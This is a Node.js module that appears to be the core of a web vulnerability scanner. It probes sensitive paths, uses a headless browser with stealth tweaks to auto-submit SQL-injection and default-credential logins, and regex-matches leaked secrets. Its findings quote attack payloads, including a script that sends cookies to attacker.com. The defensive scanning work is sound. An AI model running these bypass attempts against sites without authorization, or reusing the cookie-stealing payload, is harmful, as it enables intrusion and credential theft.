// backend/src/utils/scan.js
import axios from "axios";
import tls from "tls";
import { URL } from "url";
import { generateAiRecommendations } from "./ai.js"; // optional - keep if you have ai.js
import puppeteer from "puppeteer";
import { testLoginSQLInjection, generateSQLInjectionReport } from "./sqlInjectionTest.js";
import { captureUrl, captureResponseComparison, captureHeaders, captureTlsInfo, closeSharedBrowser } from "./screenshotCapture.js";

/**
 * Simple exponential backoff retry wrapper.
 * fn should be an async function.
 */
async function retryWithBackoff(fn, { retries = 3, baseDelay = 500 } = {}) {
  let attempt = 0;
  while (true) {
    try {
      return await fn();
    } catch (err) {
      attempt++;
      if (attempt > retries) throw err;
      const wait = baseDelay * Math.pow(2, attempt - 1) + Math.floor(Math.random() * 100);
      await new Promise((r) => setTimeout(r, wait));
    }
  }
}

/**
 * AGGRESSIVE SCAN: Directory/File Enumeration
 * Tests for common exposed directories and files
 */
async function checkExposedPaths(baseUrl) {
  const findings = [];
  const sensitiveUrls = [
    { path: '/installer/', name: 'Installer Directory', severity: 'Critical' },
    { path: '/install/', name: 'Install Directory', severity: 'Critical' },
    { path: '/setup/', name: 'Setup Directory', severity: 'Critical' },
    { path: '/config/', name: 'Config Directory', severity: 'Critical' },
    { path: '/admin/', name: 'Admin Panel', severity: 'High' },
    { path: '/phpmyadmin/', name: 'phpMyAdmin', severity: 'Critical' },
    { path: '/adminer.php', name: 'Adminer Database Tool', severity: 'Critical' },
    { path: '/.git/', name: 'Git Repository', severity: 'Critical' },
    { path: '/.env', name: 'Environment File', severity: 'Critical' },
    { path: '/backup/', name: 'Backup Directory', severity: 'High' },
    { path: '/logs/', name: 'Logs Directory', severity: 'High' },
    { path: '/debug/', name: 'Debug Directory', severity: 'High' },
    { path: '/test/', name: 'Test Directory', severity: 'Medium' },
    { path: '/temp/', name: 'Temp Directory', severity: 'Medium' },
    { path: '/sql/', name: 'SQL Directory', severity: 'Critical' },
    { path: '/database/', name: 'Database Directory', severity: 'Critical' },
    { path: '/wp-admin/', name: 'WordPress Admin', severity: 'High' },
    { path: '/wp-config.php', name: 'WordPress Config', severity: 'Critical' },
    { path: '/xmlrpc.php', name: 'XML-RPC (WordPress)', severity: 'Medium' },
    { path: '/server-status', name: 'Apache Server Status', severity: 'Medium' },
    { path: '/server-info', name: 'Apache Server Info', severity: 'Medium' },
    { path: '/.htaccess', name: 'htaccess File', severity: 'High' },
    { path: '/.htpasswd', name: 'htpasswd File', severity: 'Critical' },
    { path: '/phpinfo.php', name: 'PHP Info', severity: 'High' },
    { path: '/info.php', name: 'PHP Info', severity: 'High' },
    { path: '/robots.txt', name: 'Robots.txt', severity: 'Low' },
    { path: '/sitemap.xml', name: 'Sitemap', severity: 'Low' },
  ];

  const url = new URL(baseUrl);
  const origin = url.origin + url.pathname.replace(/\/?$/, '');

  console.log('🔍 Checking for exposed directories and files...');

  for (const item of sensitiveUrls) {
    try {
      const testUrl = origin + item.path;
      const resp = await axios.get(testUrl, {
        timeout: 5000,
        maxRedirects: 0,
        validateStatus: () => true,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      // Check if path is accessible (200 OK or 403 Forbidden with content)
      if (resp.status === 200) {
        const contentType = (resp.headers['content-type'] || '').toLowerCase();
        const hasContent = resp.data && resp.data.length > 100;
        const isDirectoryListing = resp.data && (
          resp.data.includes('Index of') ||
          resp.data.includes('Directory listing') ||
          resp.data.includes('Parent Directory')
        );

        if (hasContent) {
          const findingId = `dir-${item.path.replace(/[^a-z0-9]/gi, '')}`;

          // Capture browser screenshot of the exposed resource
          let screenshot = null;
          try {
            screenshot = await captureUrl(testUrl, findingId, `Exposed: ${item.name}`);
          } catch (e) {
            console.warn(`Screenshot failed for ${findingId}:`, e.message);
          }

          findings.push({
            id: findingId,
            title: `Exposed: ${item.name}`,
            severity: item.severity,
            owasp: 'A01:2021',
            description: `The path ${item.path} is accessible and returns content.${isDirectoryListing ? ' Directory listing is enabled!' : ''}`,
            remediation: `Restrict access to ${item.path} using .htaccess, web server config, or remove if not needed.`,
            exploit: {
              loophole: `The ${item.name} at ${item.path} is publicly accessible without authentication.`,
              attackVector: isDirectoryListing
                ? 'Directory listing allows attackers to browse all files in the directory, potentially exposing sensitive configuration, credentials, or backup files.'
                : 'Attackers can access this sensitive resource directly to gather information or exploit functionality.',
              examplePayload: `Direct access: ${testUrl}`,
              screenshots: screenshot ? [screenshot] : [],
              findings: [{
                type: isDirectoryListing ? 'Directory Listing' : 'Exposed Path',
                payload: testUrl,
                evidence: `HTTP ${resp.status} with ${resp.data?.length || 0} bytes content`
              }]
            }
          });
          console.log(`  ⚠️  FOUND: ${item.name} at ${item.path}`);
        }
      }
    } catch (err) {
      // Path not accessible or error - continue
    }
  }

  return findings;
}

/**
 * AGGRESSIVE SCAN: Authentication Bypass Tests
 */
async function testAuthBypass(baseUrl) {
  const findings = [];
  const url = new URL(baseUrl);
  const origin = url.origin + url.pathname.replace(/\/?$/, '');

  console.log('🔍 Testing for authentication bypass vulnerabilities...');

  // Common bypass payloads for login forms
  const bypassPayloads = [
    { user: "admin'--", pass: "anything", type: "SQL Comment Bypass" },
    { user: "admin' OR '1'='1", pass: "' OR '1'='1", type: "OR 1=1 Bypass" },
    { user: "' OR 1=1--", pass: "' OR 1=1--", type: "Classic SQL Injection" },
    { user: "admin'/*", pass: "anything", type: "Comment Injection" },
    { user: "admin", pass: "admin", type: "Default Credentials" },
    { user: "root", pass: "root", type: "Default Credentials" },
    { user: "test", pass: "test", type: "Default Credentials" },
    { user: "user", pass: "user", type: "Default Credentials" },
    { user: "guest", pass: "guest", type: "Default Credentials" },
  ];

  // Try to find and test login forms using Puppeteer
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: 'new',
      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    });

    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    await page.goto(baseUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });

    // Check if there's a login form
    const hasLoginForm = await page.evaluate(() => {
      const passwordInput = document.querySelector('input[type="password"]');
      const textInputs = document.querySelectorAll('input[type="text"], input[type="email"]');
      return passwordInput !== null && textInputs.length > 0;
    });

    if (hasLoginForm) {
      console.log('  📝 Login form detected, testing bypass payloads...');

      // Test a few payloads
      for (const payload of bypassPayloads.slice(0, 5)) {
        try {
          await page.goto(baseUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });

          // Fill in credentials
          const userInput = await page.$('input[type="text"], input[type="email"], input[name*="user"], input[name*="login"], input[name*="email"]');
          const passInput = await page.$('input[type="password"]');

          if (userInput && passInput) {
            await userInput.click({ clickCount: 3 });
            await userInput.type(payload.user);
            await passInput.click({ clickCount: 3 });
            await passInput.type(payload.pass);

            // Submit
            const submitButton = await page.$('button[type="submit"], input[type="submit"], button:contains("Login"), button:contains("Sign")');
            if (submitButton) {
              await Promise.all([
                page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => { }),
                submitButton.click()
              ]);
            } else {
              await passInput.press('Enter');
              await page.waitForTimeout(2000);
            }

            // Check for successful login indicators
            const currentUrl = page.url();
            const pageContent = await page.content();
            const urlChanged = !currentUrl.includes('login') && currentUrl !== baseUrl;
            const hasLogoutButton = pageContent.toLowerCase().includes('logout') ||
              pageContent.toLowerCase().includes('sign out') ||
              pageContent.toLowerCase().includes('dashboard');

            if (urlChanged || hasLogoutButton) {
              const bypassFindingId = `auth-bypass-${payload.type.replace(/\s+/g, '-').toLowerCase()}`;

              // Capture side-by-side evidence of baseline vs bypass
              let bypassScreenshot = null;
              try {
                bypassScreenshot = await captureResponseComparison(
                  { url: baseUrl, method: 'POST', status: 401, headers: {}, body: 'Login required' },
                  { url: currentUrl, method: 'POST', status: 200, headers: { payload: `${payload.user} / ${payload.pass}` }, body: 'Authenticated — redirected to dashboard' },
                  bypassFindingId
                );
              } catch (e) {
                console.warn(`Bypass screenshot failed:`, e.message);
              }

              findings.push({
                id: bypassFindingId,
                title: `Authentication Bypass: ${payload.type}`,
                severity: 'Critical',
                owasp: 'A07:2021',
                description: `The login form appears vulnerable to ${payload.type}. The application redirected after submitting bypass credentials.`,
                remediation: 'Implement parameterized queries, input validation, and use secure authentication frameworks.',
                exploit: {
                  loophole: 'The authentication mechanism does not properly sanitize user input or uses weak/default credentials.',
                  attackVector: `An attacker can bypass authentication using ${payload.type} technique.`,
                  examplePayload: `Username: ${payload.user}\nPassword: ${payload.pass}`,
                  screenshots: bypassScreenshot ? [bypassScreenshot] : [],
                  findings: [{
                    type: payload.type,
                    payload: `user=${payload.user}&pass=${payload.pass}`,
                    evidence: `Redirected to: ${currentUrl}`
                  }]
                }
              });
              console.log(`  🚨 CRITICAL: ${payload.type} bypass successful!`);
              break; // Stop after finding one bypass
            }
          }
        } catch (err) {
          // Continue testing
        }
      }
    }

    await browser.close();
  } catch (err) {
    console.log('  ℹ️  Auth bypass testing error:', err.message);
    if (browser) await browser.close().catch(() => { });
  }

  return findings;
}

/**
 * AGGRESSIVE SCAN: Information Disclosure Detection
 */
async function checkInformationDisclosure(html, headers) {
  const findings = [];
  const htmlLower = (html || '').toLowerCase();

  // Check for exposed sensitive info in HTML
  const patterns = [
    { regex: /password\s*[=:]\s*["']?[^"'\s<>]+/gi, name: 'Hardcoded Password', severity: 'Critical' },
    { regex: /api[_-]?key\s*[=:]\s*["']?[a-z0-9_-]{16,}["']?/gi, name: 'API Key Exposure', severity: 'Critical' },
    { regex: /secret[_-]?key\s*[=:]\s*["']?[a-z0-9_-]{16,}["']?/gi, name: 'Secret Key Exposure', severity: 'Critical' },
    { regex: /mysql_connect\s*\([^)]+\)/gi, name: 'Database Connection String', severity: 'Critical' },
    { regex: /mongodb(\+srv)?:\/\/[^\s<>"']+/gi, name: 'MongoDB Connection String', severity: 'Critical' },
    { regex: /postgres:\/\/[^\s<>"']+/gi, name: 'PostgreSQL Connection String', severity: 'Critical' },
    { regex: /BEGIN\s+(RSA\s+)?PRIVATE\s+KEY/gi, name: 'Private Key Exposure', severity: 'Critical' },
    { regex: /eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}/gi, name: 'JWT Token in Source', severity: 'High' },
    { regex: /<!--[\s\S]*?(debug|todo|fixme|hack|password|secret)[\s\S]*?-->/gi, name: 'Sensitive HTML Comment', severity: 'Medium' },
    { regex: /stack\s*trace|exception|error\s+in|fatal\s+error/gi, name: 'Error Message Disclosure', severity: 'Medium' },
  ];

  for (const pattern of patterns) {
    const matches = html.match(pattern.regex);
    if (matches && matches.length > 0) {
      findings.push({
        id: `info-${pattern.name.replace(/\s+/g, '-').toLowerCase()}`,
        title: `Information Disclosure: ${pattern.name}`,
        severity: pattern.severity,
        owasp: 'A01:2021',
        description: `Sensitive information (${pattern.name}) detected in page source.`,
        remediation: 'Remove sensitive data from client-side code. Use environment variables and server-side configuration.',
        exploit: {
          loophole: `Sensitive information is exposed in the page source code.`,
          attackVector: 'An attacker can view the page source and extract sensitive credentials or tokens.',
          findings: matches.slice(0, 3).map(m => ({
            type: pattern.name,
            payload: 'View Source',
            evidence: m.substring(0, 100) + (m.length > 100 ? '...' : '')
          }))
        }
      });
    }
  }

  // Check for PHP version disclosure
  if (headers['x-powered-by'] && headers['x-powered-by'].toLowerCase().includes('php')) {
    const phpVersion = headers['x-powered-by'];
    findings.push({
      id: 'info-php-version',
      title: 'PHP Version Disclosure',
      severity: 'Medium',
      description: `Server discloses PHP version: ${phpVersion}`,
      remediation: 'Disable expose_php in php.ini or configure web server to remove X-Powered-By header.',
      exploit: {
        loophole: 'The server exposes its PHP version in response headers.',
        attackVector: 'Attackers can use this information to search for known vulnerabilities in the specific PHP version.',
        examplePayload: `${phpVersion} - Check CVE databases for known exploits`
      }
    });
  }

  return findings;
}

/**
 * TLS / certificate check using tls.connect
 */
async function getCertificateInfo(hostname, port = 443, timeout = 5000) {
  return new Promise((resolve) => {
    const socket = tls.connect(
      {
        host: hostname,
        port,
        servername: hostname,
        rejectUnauthorized: false,
        ALPNProtocols: ["http/1.1"],
      },
      () => {
        const cert = socket.getPeerCertificate(true);
        if (!cert || Object.keys(cert).length === 0) {
          socket.end();
          return resolve({ ok: false, error: "No certificate" });
        }
        const now = new Date();
        const validFrom = new Date(cert.valid_from);
        const validTo = new Date(cert.valid_to);
        const expiresInDays = Math.ceil((validTo - now) / (1000 * 60 * 60 * 24));
        resolve({
          ok: true,
          subject: cert.subject,
          issuer: cert.issuer,
          validFrom: validFrom.toISOString(),
          validTo: validTo.toISOString(),
          expiresInDays,
          raw: {
            valid_from: cert.valid_from,
            valid_to: cert.valid_to,
          },
        });
        socket.end();
      }
    );

    socket.setTimeout(timeout, () => {
      socket.destroy();
      resolve({ ok: false, error: "TLS lookup timed out" });
    });

    socket.on("error", (err) => {
      resolve({ ok: false, error: String(err) });
    });
  });
}

/**
 * Header security checks
 */
function runHeaderChecks(headers) {
  const findings = [];

  const h = {};
  // normalize header names
  for (const [k, v] of Object.entries(headers || {})) {
    h[k.toLowerCase()] = typeof v === "string" ? v : Array.isArray(v) ? v.join("; ") : String(v);
  }

  if (!h["content-security-policy"]) {
    findings.push({
      id: `hdr-01`,
      title: "Missing Content-Security-Policy",
      severity: "High",
      owasp: "A05:2021",
      description: "No CSP header found — increases risk of XSS and data injection.",
      remediation:
        "Add a restrictive Content-Security-Policy. Example: Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.example.com; object-src 'none';",
      exploit: {
        loophole: "Without CSP, the browser has no restrictions on what scripts can execute or where resources can be loaded from.",
        attackVector: "An attacker can inject malicious scripts through XSS vulnerabilities, and the browser will execute them without any policy restrictions.",
        examplePayload: "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\n\nThis payload steals cookies and sends them to an attacker-controlled server."
      }
    });
  } else {
    // quick detection of very permissive CSP
    if (h["content-security-policy"].includes("*") || h["content-security-policy"].includes("unsafe-inline")) {
      findings.push({
        id: `hdr-01b`,
        title: "Permissive Content-Security-Policy",
        severity: "Medium",
        owasp: "A05:2021",
        description: "CSP appears permissive (unsafe-inline or wildcard), lowering effectiveness.",
        remediation: "Tighten CSP: avoid 'unsafe-inline' and wildcards; specify trusted sources.",
      });
    }
  }

  if (!h["strict-transport-security"]) {
    findings.push({
      id: `hdr-02`,
      title: "Missing HSTS header",
      severity: "Medium",
      owasp: "A06:2021",
      description: "Strict-Transport-Security not set; site may allow insecure connections.",
      remediation: "Add Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
      exploit: {
        loophole: "Without HSTS, browsers may initially connect via HTTP before upgrading to HTTPS, creating a window for man-in-the-middle attacks.",
        attackVector: "An attacker on the same network can intercept the initial HTTP request and downgrade the connection or steal session tokens.",
        examplePayload: "User types 'example.com' → Browser tries http://example.com first → Attacker intercepts and serves fake login page → Credentials stolen"
      }
    });
  }

  if (!h["x-frame-options"] && !h["content-security-policy"]?.includes("frame-ancestors")) {
    findings.push({
      id: `hdr-03`,
      title: "Missing clickjacking protection",
      severity: "Medium",
      owasp: "A05:2021",
      description: "No X-Frame-Options or CSP frame-ancestors; page may be embedded in frames.",
      remediation: "Add X-Frame-Options: DENY or set CSP frame-ancestors 'none'.",
      exploit: {
        loophole: "The application can be embedded in an iframe on any malicious website without restrictions.",
        attackVector: "An attacker creates a malicious page with your site in an invisible iframe, overlaying fake UI elements to trick users into performing actions.",
        examplePayload: "<iframe src='https://yoursite.com/transfer' style='opacity:0'></iframe>\n<button style='position:absolute;top:100px'>Click to win!</button>\n\nUser clicks 'win' button but actually clicks 'transfer money' in the hidden iframe."
      }
    });
  }

  if (!h["x-content-type-options"]) {
    findings.push({
      id: `hdr-04`,
      title: "Missing X-Content-Type-Options",
      severity: "Low",
      owasp: "A06:2021",
      description: "No X-Content-Type-Options header; some MIME sniffing risk remains.",
      remediation: "Add X-Content-Type-Options: nosniff",
      exploit: {
        loophole: "Browsers may MIME-sniff content and execute files differently than intended based on their content rather than declared Content-Type.",
        attackVector: "An attacker uploads a file disguised as an image but containing JavaScript. The browser sniffs it and executes it as a script.",
        examplePayload: "Upload 'image.jpg' containing: GIF89a<script>alert('XSS')</script>\n\nBrowser detects HTML/JS and executes it despite .jpg extension."
      }
    });
  }

  if (!h["referrer-policy"]) {
    findings.push({
      id: `hdr-05`,
      title: "Missing Referrer-Policy",
      severity: "Low",
      description: "No Referrer-Policy header detected.",
      remediation: "Add Referrer-Policy: no-referrer-when-downgrade or strict-origin-when-cross-origin",
    });
  }

  if (!h["permissions-policy"] && !h["feature-policy"]) {
    findings.push({
      id: `hdr-06`,
      title: "Missing Permissions-Policy (Feature-Policy)",
      severity: "Low",
      description: "No Permissions-Policy found — site may expose unnecessary features.",
      remediation: "Add Permissions-Policy header to restrict camera/gyroscope/usb etc. to trusted origins.",
    });
  }

  return { findings, normalized: h };
}

/**
 * Puppeteer fallback fetch (loads JS)
 */
async function puppeteerFetch(url, timeout = 20000) {
  const browser = await puppeteer.launch({
    headless: "new", // 'new' when available, else true
    executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-infobars",
      "--window-size=1280,800",
    ],
  });

  try {
    const page = await browser.newPage();

    // set a realistic UA (rotate here if you want)
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    );
    await page.setViewport({ width: 1280, height: 800 });

    // simple stealth measures
    await page.evaluateOnNewDocument(() => {
      // remove webdriver
      Object.defineProperty(navigator, "webdriver", { get: () => false });
      // mock chrome object
      window.chrome = { runtime: {} };
      // languages
      Object.defineProperty(navigator, "languages", { get: () => ["en-US", "en"] });
      // permissions
      const originalQuery = window.navigator.permissions.query;
      window.navigator.permissions.query = (parameters) =>
        parameters.name === "notifications"
          ? Promise.resolve({ state: Notification.permission })
          : originalQuery(parameters);
    });

    // intercept response to collect headers
    let collectedHeaders = {};
    page.on("response", (resp) => {
      try {
        if (resp.url() === url) {
          collectedHeaders = resp.headers();
        }
      } catch (e) { }
    });

    await page.goto(url, { waitUntil: "domcontentloaded", timeout });

    // wait a short time for JS to run
    await page.waitForTimeout(1200);

    const html = await page.content();

    // optionally snapshot cookies, status, final URL
    const status = (await page.mainFrame().executionContext().evaluate(() => document?.readyState)) || "unknown";

    const finalUrl = page.url();

    await page.close();
    await browser.close();

    return {
      html,
      headers: collectedHeaders,
      finalUrl,
      status,
    };
  } catch (err) {
    try {
      await browser.close();
    } catch (e) { }
    throw err;
  }
}

/**
 * The main exported function that performs a scan of a target URL.
 */
export async function scanTarget(rawUrl) {
  // Normalize the url
  let url;
  try {
    url = new URL(rawUrl);
    if (!url.protocol || !["http:", "https:"].includes(url.protocol)) {
      throw new Error("Invalid protocol");
    }
  } catch (err) {
    throw new Error("Invalid URL provided");
  }

  // results container
  const vulnerabilities = [];
  let headers = {};
  let ai = null;
  let tlsInfo = null;

  // 1) TLS check (if https)
  if (url.protocol === "https:") {
    try {
      const certInfo = await getCertificateInfo(url.hostname, url.port || 443);
      tlsInfo = certInfo;

      // Capture TLS screenshot evidence
      let tlsScreenshot = null;
      if (!certInfo.ok || certInfo.expiresInDays <= 14) {
        try {
          const tlsFindingId = certInfo.ok ? 'tls-02' : 'tls-01';
          tlsScreenshot = await captureTlsInfo(certInfo, tlsFindingId, url.hostname);
        } catch (e) {
          console.warn('TLS screenshot failed:', e.message);
        }
      }

      if (!certInfo.ok) {
        vulnerabilities.push({
          id: "tls-01",
          title: "TLS/SSL problem",
          severity: "High",
          description: `TLS check failed: ${certInfo.error || "unknown"}`,
          remediation: "Ensure a valid certificate is installed and accessible.",
          exploit: {
            screenshots: tlsScreenshot ? [tlsScreenshot] : []
          }
        });
      } else if (certInfo.expiresInDays <= 14) {
        vulnerabilities.push({
          id: "tls-02",
          title: "Certificate expires soon",
          severity: "Medium",
          description: `Certificate expires in ${certInfo.expiresInDays} days.`,
          remediation: "Renew the SSL/TLS certificate before expiry.",
          exploit: {
            screenshots: tlsScreenshot ? [tlsScreenshot] : []
          }
        });
      }
    } catch (err) {
      // swallow, push an info
      tlsInfo = { ok: false, error: String(err) };
    }
  }

  // helper to try axios then fallback to puppeteer
  const fetcher = async () => {
    // try axios first
    try {
      const resp = await axios.get(url.toString(), {
        timeout: 12_000,
        maxRedirects: 5,
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        },
        validateStatus: () => true,
      });

      headers = resp.headers || {};
      // if content-type is HTML and status is 200 - good result
      const ct = (headers["content-type"] || "").toLowerCase();
      if (resp.status >= 400 || !ct.includes("text/html")) {
        // fallback to puppeteer for pages requiring JS or returning non-HTML
        throw new Error(`Axios returned status ${resp.status} or non-HTML content`);
      }

      return { source: "axios", html: resp.data, headers, finalUrl: resp.request?.res?.responseUrl || url.toString() };
    } catch (errAxios) {
      // fallback to puppeteer
      const pu = await puppeteerFetch(url.toString(), 25000);
      headers = pu.headers || headers;
      return { source: "puppeteer", html: pu.html, headers, finalUrl: pu.finalUrl || url.toString() };
    }
  };

  // Execute with retry/backoff
  let fetchResult;
  try {
    fetchResult = await retryWithBackoff(fetcher, { retries: 2, baseDelay: 600 });
  } catch (err) {
    throw new Error("Target is unreachable or blocked.");
  }

  // Execute aggressive scans (Phase 4 integration)
  try {
    const exposedFindings = await checkExposedPaths(url.toString());
    vulnerabilities.push(...exposedFindings);
  } catch (e) {
    console.warn("Exposed paths check failed:", e.message);
  }

  try {
    const authFindings = await testAuthBypass(url.toString());
    vulnerabilities.push(...authFindings);
  } catch (e) {
    console.warn("Auth bypass check failed:", e.message);
  }

  try {
    const infoFindings = await checkInformationDisclosure(fetchResult.html, headers);
    vulnerabilities.push(...infoFindings);
  } catch (e) {
    console.warn("Info disclosure check failed:", e.message);
  }

  // header checks
  const headerCheckResult = runHeaderChecks(headers);
  vulnerabilities.push(...headerCheckResult.findings);

  // Capture consolidated headers screenshot if any header findings exist
  if (headerCheckResult.findings.length > 0) {
    try {
      const missingHdrs = [];
      if (!headers['content-security-policy']) missingHdrs.push('content-security-policy');
      if (!headers['strict-transport-security']) missingHdrs.push('strict-transport-security');
      if (!headers['x-frame-options']) missingHdrs.push('x-frame-options');
      if (!headers['x-content-type-options']) missingHdrs.push('x-content-type-options');
      if (!headers['referrer-policy']) missingHdrs.push('referrer-policy');
      if (!headers['permissions-policy'] && !headers['feature-policy']) missingHdrs.push('permissions-policy');

      const hdrScreenshot = await captureHeaders(url.toString(), headers, missingHdrs, 'hdr-scan');
      if (hdrScreenshot) {
        for (const finding of headerCheckResult.findings) {
          if (!finding.exploit) finding.exploit = {};
          finding.exploit.screenshots = [hdrScreenshot];
        }
      }
    } catch (e) {
      console.warn('Header screenshot capture failed:', e.message);
    }
  }

  // some basic automated findings based on header content
  // detect server info leakage
  if (headers.server && headers.server.length > 0) {
    vulnerabilities.push({
      id: "hdr-XX-server",
      title: "Server header present",
      severity: "Low",
      description: `Server header discloses server info: ${headers.server}`,
      remediation: "Consider removing or obfuscating the Server header.",
    });
  }

  // X-Powered-By
  if (headers["x-powered-by"]) {
    vulnerabilities.push({
      id: "hdr-XX-xpb",
      title: "X-Powered-By header present",
      severity: "Low",
      description: `X-Powered-By header: ${headers["x-powered-by"]}`,
      remediation: "Remove X-Powered-By header to avoid disclosing framework info.",
    });
  }

  // simple mixed-content check (if the page uses HTTP resources)
  try {
    const htmlLower = (fetchResult.html || "").toLowerCase();
    if (htmlLower.includes('src="http:') || htmlLower.includes("src=http:") || htmlLower.includes("href=\"http:")) {
      vulnerabilities.push({
        id: "misc-01",
        title: "Mixed content detected",
        severity: "Medium",
        description: "Page includes HTTP resources while served over HTTPS (mixed content).",
        remediation: "Serve all resources (scripts, images, CSS) over HTTPS.",
      });
    }
  } catch (e) { }

  // SQL Injection testing (for authorized penetration testing only)
  console.log("🔍 Testing for SQL injection vulnerabilities...");
  try {
    const sqlInjectionResults = await testLoginSQLInjection(url.toString());
    if (sqlInjectionResults.vulnerable) {
      const sqlReport = generateSQLInjectionReport(sqlInjectionResults);
      if (sqlReport) {
        vulnerabilities.push(sqlReport);
        console.log("⚠️  SQL Injection vulnerability detected!");
      }
    }
  } catch (sqlErr) {
    console.log("SQL injection test failed:", sqlErr.message);
  }

  // AI recommendations: try to call external function if available
  try {
    if (typeof generateAiRecommendations === "function") {
      try {
        ai = await generateAiRecommendations({
          target: url.toString(),
          headers,
          findings: vulnerabilities,
        });
      } catch (aiErr) {
        ai = { error: "AI generation failed", info: String(aiErr) };
      }
    }
  } catch (e) {
    // ignore missing ai module
  }

  // Clean up shared browser instance at the end of the scan
  try {
    await closeSharedBrowser();
  } catch (e) {
    // ignore cleanup errors
  }

  return {
    target: url.toString(),
    vulnerabilities,
    headers,
    tls: tlsInfo,
    fetch: { source: fetchResult.source, finalUrl: fetchResult.finalUrl },
    ai,
    generatedAt: new Date().toISOString(),
  };
}
